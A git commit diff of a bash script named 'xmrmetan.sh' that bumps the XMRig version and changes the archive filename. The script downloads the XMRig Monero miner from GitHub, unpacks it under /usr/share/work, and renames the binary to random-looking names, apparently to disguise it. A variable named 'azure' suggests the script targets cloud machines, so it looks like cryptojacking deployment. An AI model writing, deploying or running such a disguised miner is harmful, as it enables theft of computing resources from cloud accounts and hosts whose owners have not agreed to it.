329463faba521fc09642a9b4f2352a894dbaaa16
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2020-12-31 18:14:22 +0700

    Update xmrmetan.sh

--- xmrmetan.sh
+++ xmrmetan.sh
@@ -1,16 +1,16 @@
 #!/bin/bash 
 sudo apt-get update
-VERSION=6.3.1
+VERSION=6.7.0
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 apt-get install -y git wget screen
 mkdir /usr/share
 mkdir /usr/share/work
 rm -r /usr/share/work/xmrig-$VERSION
-wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
-mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
-rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
+wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
+mv xmrig-$VERSION-linux-x64.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-linux-x64.tar.gz
+rm -rf xmrig-$VERSION-linux-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
